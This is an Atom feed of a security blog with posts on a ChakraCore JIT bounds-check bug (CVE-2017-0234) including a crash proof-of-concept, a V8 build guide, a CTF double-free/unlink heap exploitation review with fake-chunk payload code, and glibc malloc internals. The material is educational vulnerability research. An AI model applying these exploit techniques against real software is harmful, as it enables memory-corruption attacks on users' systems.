<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>P1umerのblog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://p1umer.club/"/>
  <updated>2018-07-03T18:43:22.597Z</updated>
  <id>http://p1umer.club/</id>
  
  <author>
    <name>P1umer sauce</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Analysis of CVE-2017-0234</title>
    <link href="http://p1umer.club/2018/07/03/Analysis-of-CVE-2017-0234/"/>
    <id>http://p1umer.club/2018/07/03/Analysis-of-CVE-2017-0234/</id>
    <published>2018-07-03T15:39:29.000Z</published>
    <updated>2018-07-03T18:43:22.597Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Javascript-Function-Executions"><a href="#Javascript-Function-Executions" class="headerlink" title="Javascript Function Executions"></a>Javascript Function Executions</h2><p>  <a href="https://medium.com/@gaurav.pandvia/understanding-javascript-function-executions-tasks-event-loop-call-stack-more-part-1-5683dea1f5ec" target="_blank" rel="noopener">Understanding Javascript Function Executions — Call Stack, Event Loop , Tasks &amp; more</a></p><h2 id="Debug-with-Windbg"><a href="#Debug-with-Windbg" class="headerlink" title="Debug with Windbg"></a>Debug with Windbg</h2><ul><li>.restart   — restart debugging</li><li>g — run</li><li>r — registers</li><li>k — show the call stack<a id="more"></a></li><li>u — disassem</li><li>t — step in</li><li>Launch  executable — debug with parameter binded<br><img src="https://img-blog.csdn.net/20180703230802157?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMjY1Njc3/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt=""></li><li>Source code<br><img src="https://img-blog.csdn.net/20180703231311238?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMjY1Njc3/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt=""><br><img src="https://img-blog.csdn.net/20180703231504419?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMjY1Njc3/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt=""></li></ul><h2 id="Environmental-configuration"><a href="#Environmental-configuration" class="headerlink" title="Environmental configuration"></a>Environmental configuration</h2><ul><li>windbg</li><li>vs2015</li><li>win10</li><li><a href="https://github.com/Microsoft/ChakraCore/tree/v1.4.3" target="_blank" rel="noopener">ChakraCore v1.4.3</a></li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">for (var i=0;i&lt;20;i++)</span><br><span class="line">&#123;</span><br><span class="line">function write(begin, end, step, num) &#123;</span><br><span class="line">    for (var i = begin; i &lt; end; i += step) view[i] = num;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var buffer = new ArrayBuffer(0x10000);</span><br><span class="line">var view = new Uint32Array(buffer);</span><br><span class="line"></span><br><span class="line">write(0, 0x4000, 1, 0x1234);</span><br><span class="line">write(0x10010, 0x10020, 0x1, 0x12345678);</span><br><span class="line">//sleep(100);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></code></pre><h3 id="process"><a href="#process" class="headerlink" title="process"></a>process</h3><ul><li><p>运行程序发现CRASH<br><img src="https://img-blog.csdn.net/20180704015904689?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMjY1Njc3/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p></li><li><p>查看函数调用栈</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">k</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdn.net/20180704015953339?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMjY1Njc3/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p></li><li><p>定位上一级函数<br><img src="https://img-blog.csdn.net/20180704015826968?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMjY1Njc3/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p></li><li><p>定位处下断点并重启调试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.restart</span><br><span class="line">g</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdn.net/20180704020623244?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMjY1Njc3/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>发现call rax跳转到了JIT代码部分</p></li><li><p>查看JIT代码以及寄存器的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">窗口VIEW-&gt;Disassembly</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdn.net/20180704020945385?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMjY1Njc3/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br><img src="https://img-blog.csdn.net/2018070402135962?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMjY1Njc3/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>发现：JIT代码中并没有对r9的值进行检测（r9是poc中的begin的值为0x10010）；即忽略了初始index的检查。不过cmp r9d，r10d检测了end&gt;begin.</p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Javascript-Function-Executions&quot;&gt;&lt;a href=&quot;#Javascript-Function-Executions&quot; class=&quot;headerlink&quot; title=&quot;Javascript Function Executions&quot;&gt;&lt;/a&gt;Javascript Function Executions&lt;/h2&gt;&lt;p&gt;  &lt;a href=&quot;https://medium.com/@gaurav.pandvia/understanding-javascript-function-executions-tasks-event-loop-call-stack-more-part-1-5683dea1f5ec&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Understanding Javascript Function Executions — Call Stack, Event Loop , Tasks &amp;amp; more&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;Debug-with-Windbg&quot;&gt;&lt;a href=&quot;#Debug-with-Windbg&quot; class=&quot;headerlink&quot; title=&quot;Debug with Windbg&quot;&gt;&lt;/a&gt;Debug with Windbg&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;.restart   — restart debugging&lt;/li&gt;
&lt;li&gt;g — run&lt;/li&gt;
&lt;li&gt;r — registers&lt;/li&gt;
&lt;li&gt;k — show the call stack
    
    </summary>
    
      <category term="Browser Explore" scheme="http://p1umer.club/categories/Browser-Explore/"/>
    
      <category term="Edge" scheme="http://p1umer.club/categories/Browser-Explore/Edge/"/>
    
    
      <category term="Browser Explore" scheme="http://p1umer.club/tags/Browser-Explore/"/>
    
  </entry>
  
  <entry>
    <title>V8 Environmental Configuration</title>
    <link href="http://p1umer.club/2018/07/01/V8-Environmental-Configuration/"/>
    <id>http://p1umer.club/2018/07/01/V8-Environmental-Configuration/</id>
    <published>2018-07-01T09:35:44.000Z</published>
    <updated>2018-07-03T16:02:25.632Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Pre-Work"><a href="#Pre-Work" class="headerlink" title="Pre Work"></a>Pre Work</h2><h3 id="Install-Git"><a href="#Install-Git" class="headerlink" title="Install Git"></a>Install Git</h3> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install git</span><br></pre></td></tr></table></figure><h3 id="Install-depot-tools"><a href="#Install-depot-tools" class="headerlink" title="Install depot_tools"></a>Install depot_tools</h3> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://chromium.googlesource.com/chromium/tools/depot_tools</span><br><span class="line">export PATH=`pwd`/depot_tools:&quot;$PATH&quot;</span><br></pre></td></tr></table></figure> <a id="more"></a><h3 id="外网配置"><a href="#外网配置" class="headerlink" title="外网配置"></a>外网配置</h3><pre><code>原谅我之前没有用到过终端代理...不过通过sstap解决了代理问题：[SSTap](https://www.sockscap64.com/zh-hans/sstap/)能在网络层拦截所有连接并转发给HTTP，SOCKS4，5，SHADOWSOCKS代理。是一种硬核的全局代理。&amp;nbsp;</code></pre><h2 id="Key-Step"><a href="#Key-Step" class="headerlink" title="Key Step"></a>Key Step</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gclient</span><br><span class="line">mkdir v8</span><br><span class="line">cd v8</span><br><span class="line">fetch v8</span><br><span class="line">-</span><br><span class="line">tools/dev/v8gen.py x64.debug</span><br><span class="line">ninja -C out.gn/x64.debug</span><br></pre></td></tr></table></figure><p>此时编译的是最新版本的v8<br>若想切换分支，在(-)处执行以下命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard +hash</span><br><span class="line">tools/dev/v8gen.py x64.debug</span><br><span class="line">ninja -C out.gn/x64.debug</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Pre-Work&quot;&gt;&lt;a href=&quot;#Pre-Work&quot; class=&quot;headerlink&quot; title=&quot;Pre Work&quot;&gt;&lt;/a&gt;Pre Work&lt;/h2&gt;&lt;h3 id=&quot;Install-Git&quot;&gt;&lt;a href=&quot;#Install-Git&quot; class=&quot;headerlink&quot; title=&quot;Install Git&quot;&gt;&lt;/a&gt;Install Git&lt;/h3&gt; &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;apt-get install git&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;Install-depot-tools&quot;&gt;&lt;a href=&quot;#Install-depot-tools&quot; class=&quot;headerlink&quot; title=&quot;Install depot_tools&quot;&gt;&lt;/a&gt;Install depot_tools&lt;/h3&gt; &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git clone https://chromium.googlesource.com/chromium/tools/depot_tools&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;export PATH=`pwd`/depot_tools:&amp;quot;$PATH&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Browser Explore" scheme="http://p1umer.club/categories/Browser-Explore/"/>
    
      <category term="V8" scheme="http://p1umer.club/categories/Browser-Explore/V8/"/>
    
    
      <category term="Browser Explore" scheme="http://p1umer.club/tags/Browser-Explore/"/>
    
  </entry>
  
  <entry>
    <title>Review of  DoubleFree</title>
    <link href="http://p1umer.club/2018/06/30/Review-of-DoubleFree/"/>
    <id>http://p1umer.club/2018/06/30/Review-of-DoubleFree/</id>
    <published>2018-06-30T04:50:26.000Z</published>
    <updated>2018-07-03T15:58:06.857Z</updated>
    
    <content type="html"><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>周末趁着一道note题重新复习了一遍doublefree，现在简单的总结一下。<br>&nbsp;</p><h2 id="Glibc堆分配方式"><a href="#Glibc堆分配方式" class="headerlink" title="Glibc堆分配方式"></a>Glibc堆分配方式</h2><p>详细在我的这篇博客：<a href="http://p1umer.club/2018/06/30/Linux-Glibc-Analysis/">linux Glibc Analysis</a></p><a id="more"></a><p>&nbsp;</p><h2 id="DoubleFree"><a href="#DoubleFree" class="headerlink" title="DoubleFree"></a>DoubleFree</h2><p>字面意思，free同一块内存两次。实际上，double并非必要条件，核心在于free一块精心构造的chunk。<br>在free的时候，要匹配三项检查：</p><ul><li><strong>flag位</strong>：这里要构造三块的flag。</li><li><strong>size位</strong>：nextseconedChunk的size位无需考虑，pre&amp;next需要构造。</li><li><p><strong>指针匹配</strong>：这个主要就是0x18&amp;0x10的构造了，通过将ptr-0x18，ptr-0x10覆盖住fd和bk，可以绕过下面检查：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))</span><br><span class="line"> malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);</span><br></pre></td></tr></table></figure><p>这里留意一下异常，调试程序的时候能快速定位构造错误。<br>&nbsp;</p></li></ul><h2 id="内存实例"><a href="#内存实例" class="headerlink" title="内存实例"></a>内存实例</h2><p>  <img src="https://img-blog.csdn.net/20180515134500412" alt="image"> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">  #free_chunk.pre_chunk</span><br><span class="line">context=&quot;&quot;  </span><br><span class="line">context+=p32(0x0)#free_chunk.pre_chunk.pre_chunk_size=0</span><br><span class="line">context+=p32(0x81)  #free_chunk.pre_chunk=0x80 &amp;&amp; free_chunk.pre_chunk.pre_chunk is in use</span><br><span class="line">context+=p32(heap_addr+sub_heap+0x70-0x4-0xc)#fd = ptr addr which stores free_chunk_addr -0xc</span><br><span class="line">context+=p32(heap_addr+sub_heap+0x70-0x4-0x8)#bk = ptr addr which stores free_chunk_addr -0x8</span><br><span class="line">context+=&apos;a&apos;*(0x80-0x10) #padding </span><br><span class="line"></span><br><span class="line">#free_chunk</span><br><span class="line">context+=p32(0x80)  #free_chunk.pre_chunk_size=0x80</span><br><span class="line">context+=p32(0x88)  #free_chunk_size=0x88 &amp;&amp; free_chunk.pre_chunk is free</span><br><span class="line">context+=&apos;m&apos;*0x80 #padding</span><br><span class="line"></span><br><span class="line">free_chunk.next_chunk</span><br><span class="line">context+=p32(0x88) #free_chunk.next_chunk.pre_chunk_size = free_chunk_size</span><br><span class="line">context+=p32(0x79) #free_chunk.next_chunk_size=0x79 &amp;&amp; free_chunk is in use</span><br><span class="line">#ATTENTION 0x79 matters the free_chunk.next_chunk is use or not,so you have to calc the size to enture the free_chunk.next_chunk.next_chunk.flag is 1!!!</span><br><span class="line">oh,in addition, this_chunk.next_chunk is located by the chunk _size:)</span><br><span class="line">context+=p32(0)</span><br><span class="line">context+=p32(0)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;写在前面&quot;&gt;&lt;a href=&quot;#写在前面&quot; class=&quot;headerlink&quot; title=&quot;写在前面&quot;&gt;&lt;/a&gt;写在前面&lt;/h2&gt;&lt;p&gt;周末趁着一道note题重新复习了一遍doublefree，现在简单的总结一下。&lt;br&gt;&amp;nbsp;&lt;/p&gt;
&lt;h2 id=&quot;Glibc堆分配方式&quot;&gt;&lt;a href=&quot;#Glibc堆分配方式&quot; class=&quot;headerlink&quot; title=&quot;Glibc堆分配方式&quot;&gt;&lt;/a&gt;Glibc堆分配方式&lt;/h2&gt;&lt;p&gt;详细在我的这篇博客：&lt;a href=&quot;http://p1umer.club/2018/06/30/Linux-Glibc-Analysis/&quot;&gt;linux Glibc Analysis&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://p1umer.club/categories/CTF/"/>
    
      <category term="LINUX" scheme="http://p1umer.club/categories/CTF/LINUX/"/>
    
    
      <category term="CTF" scheme="http://p1umer.club/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>linux Glibc Analysis</title>
    <link href="http://p1umer.club/2018/06/30/Linux-Glibc-Analysis/"/>
    <id>http://p1umer.club/2018/06/30/Linux-Glibc-Analysis/</id>
    <published>2018-06-29T20:24:35.000Z</published>
    <updated>2018-07-01T10:39:20.117Z</updated>
    
    <content type="html"><![CDATA[<h2 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h2><hr><p>对于一个进程来说，arena可作为其堆内存管理的最高层结构。在主进程中调用malloc函数时，会首先在数据段中通过sbrk提升program break location来构造一个arena(此时arena具有一个固定初始空间)，若空间大小不满足进程需求，则系统会在后续调整program break location的位置。而针对其他进程，首次malloc会通过mmap()在未分配的(前篇文章有描述)虚拟空间内开辟出一定大小的空间给该进程的arena管理。<br>&nbsp;<br>&nbsp;<br><a id="more"></a></p><h2 id="heap-segment"><a href="#heap-segment" class="headerlink" title="heap segment"></a>heap segment</h2><hr><p>heap segment是次于arena的内存管理结构。在首次创建arena的时候会相应的生成一个heap segment，而在单个heap segment容量不够的时候，系统就要扩大堆空间。显然，由于主进程通过sbrk来扩充，因此不会产生多个heap segment。相反，其他进程通过mmap来扩充空间时，由于mmap开辟空间的不连续性，因此需要链表来联系多个heap空间。此时，每个链节便是heap segment。然鹅，为了方便管理，一个arena中不管有多少个heap segment，都只能存在一个malloc_state。<br>&nbsp;<br>&nbsp;</p><h2 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h2><hr><p><strong>Chunk共分为4类</strong></p><ul><li>allocated chunk</li><li>free chunk</li><li>top chunk</li><li><p>Last remainder chunk</p><h3 id="ALLOCATED-chunk"><a href="#ALLOCATED-chunk" class="headerlink" title="ALLOCATED_chunk"></a>ALLOCATED_chunk</h3></li><li><p>a part of pre_chunk</p></li><li>chunk_size(flag included)</li><li>user_data</li><li>padding.<h3 id="FREED-chunk"><a href="#FREED-chunk" class="headerlink" title="FREED_chunk"></a>FREED_chunk</h3>未分配的chunk结构和allcated chunk不相同，其将a part of pre_chunk替换成了pre_size，同时会储存一个前置后向指针，和一个后置前向指针。prev_size在前面的chunk是空闲的时候才是可用的。如果前面的chunk正在被使用，那么这个prev_size的空间则被前面的chunk所征用。</li></ul><p>&nbsp;<br>&nbsp;</p><h2 id="BINS"><a href="#BINS" class="headerlink" title="BINS"></a>BINS</h2><hr><p>glibc malloc分配了若干个bins，为了方便查找，glibc提供了两个数组：fastbinY和bins。fastbinY中存放了10个bins(32位)，每个bin的链节大小从16到80递增（包含chunk_header大小）;bins内存放有若干个表链，按照bin中链节的容量可以分为Small bin(大小严格递增)，Large bin(大小非严格递增)，Unsorted bin(无大小限制)。另外，每个fastbin都采用单项链表的方式组织结构，并采用LIFO。相反的，其余bin则一律采用FIFO的双向链表。<br>&nbsp;<br>&nbsp;</p><h2 id="INIT"><a href="#INIT" class="headerlink" title="INIT"></a>INIT</h2><hr><p>在第一次调用malloc的时候，此时内存中各个bin还未初始化，因此会经历下面的过程：<br><strong>系统执行_int_malloc函数，该函数首先会发现当前fast bin为空，就转交给small bin处理，进而又发现small bin 也为空，就调用malloc_consolidate函数对malloc_state结构体进行初始化，malloc_consolidate函数主要完成以下几个功能</strong></p><ul><li>首先判断当前malloc_state结构体中的fast bin是否为空，如果为空就说明整个malloc_state都没有完成初始化，需要对malloc_state进行初始化。</li><li>malloc_state的初始化操作由函数malloc_init_state(av)完成，该函数先初始化除fast bin之外的所有的bins，再初始化fast bins。</li></ul><p><strong>Warning！！！在初次初始化完成时，unsorted bin是一个空的筐。</strong><br><strong>这里总结一下malloc查找bin顺序：</strong><br>    malloc一个特定大小的内存块，系统会首先从对应长度的bins中查找，若是为空(即未初始化或unlink无剩余)，则回转从unsorted bin中查找符合条件的chunk(非top chunk顶部以及mmap产生的chunk，若大小超过 max_fast，则首先会被放到 unsorted bins中)。如果 unsorted bins 不能满足分配要求，malloc 便会将 unsorted bins中的 chunk 放到 bins 中，然后再在bins中通过binmap来遍历继续进行查找和分配（这里包含了一个清空unsorted bin的过程）。若众多的bins也不满足需求，则系统会返回arena起始段的top chunk。若top chunk也无法满足，则对top chunk采取对应的扩充手段(对主进程来说通过sbrk来直接扩大top chunk；然而针对其他进程，mmap()分配的空间不具有连续性，所以猜测是重新开辟heap segment，并把新开辟的heap的top chunk设置成合适的大小，且free后地址空间完全释放)。</p><p>&nbsp;<br>&nbsp;</p><h2 id="内存合并"><a href="#内存合并" class="headerlink" title="内存合并"></a>内存合并</h2><hr><ul><li>fastbin下的chunk不会采取内存合并，这是为了保证fast bin下的chunk大小能尽可能地碎片化。</li><li>针对除fast bin以外的其他bin表，若是其中某个chunk刚好处于将要释放的chunk的相邻位置，那么会采取解链操作将该chunk从原来的bin中解除，然后和将释放的chunk合并，再将新的chunk(大于max_fast)放置在unsorted bin中。</li></ul><h3 id="向后合并"><a href="#向后合并" class="headerlink" title="向后合并"></a>向后合并</h3><p>首先检测前一个chunk是否为free，这可以通过检测当前free chunk的PREV_INUSE(P)比特位知晓。在默认情况下，堆内存中的第一个chunk总是被设置为allocated的，即使它根本就不存在。如果为free的话，那么就进行向后合并：</p><ul><li>将前一个chunk占用的内存合并到当前chunk</li><li>修改指向当前chunk的指针，改为指向前一个chunk</li><li>使用unlink宏，将前一个free chunk从双向循环链表中移除</li></ul><h3 id="向前合并"><a href="#向前合并" class="headerlink" title="向前合并"></a>向前合并</h3><ul><li>类似</li></ul><p>&nbsp;<br>&nbsp;</p><h2 id="一些重要的话"><a href="#一些重要的话" class="headerlink" title="一些重要的话"></a>一些重要的话</h2><hr><ul><li>在我们第一次调用 malloc 期间， malloc_state 结构中的 small bin 和 large bin 结构也会被初始化，比如指针指向它们自身以表明为空。</li><li>第一次调用 malloc 时， 会初始化 malloc_state 结构中的 small bin 和large bin (bins)。比如，bins 可以指向自身，表明它是空的。 之后当 small bin 不为空， malloc 会从 binlist 中移除最后一块内存块并返回给用户。</li><li>初次malloc时，由于各个链表的初始化并未分配chunk，因此会直接检索到top chunk。</li><li>fast bin的初始化完成于第一次使用malloc，与bins数组元素不同，fast bin不进行内存合并，回收的内存直接放回对应大小的单项链表尾部。</li><li>主进程的main_arena直接储存在libc动态链接库里。</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;arena&quot;&gt;&lt;a href=&quot;#arena&quot; class=&quot;headerlink&quot; title=&quot;arena&quot;&gt;&lt;/a&gt;arena&lt;/h2&gt;&lt;hr&gt;
&lt;p&gt;对于一个进程来说，arena可作为其堆内存管理的最高层结构。在主进程中调用malloc函数时，会首先在数据段中通过sbrk提升program break location来构造一个arena(此时arena具有一个固定初始空间)，若空间大小不满足进程需求，则系统会在后续调整program break location的位置。而针对其他进程，首次malloc会通过mmap()在未分配的(前篇文章有描述)虚拟空间内开辟出一定大小的空间给该进程的arena管理。&lt;br&gt;&amp;nbsp;&lt;br&gt;&amp;nbsp;&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://p1umer.club/categories/CTF/"/>
    
      <category term="LINUX" scheme="http://p1umer.club/categories/CTF/LINUX/"/>
    
    
      <category term="CTF" scheme="http://p1umer.club/tags/CTF/"/>
    
  </entry>
  
</feed>
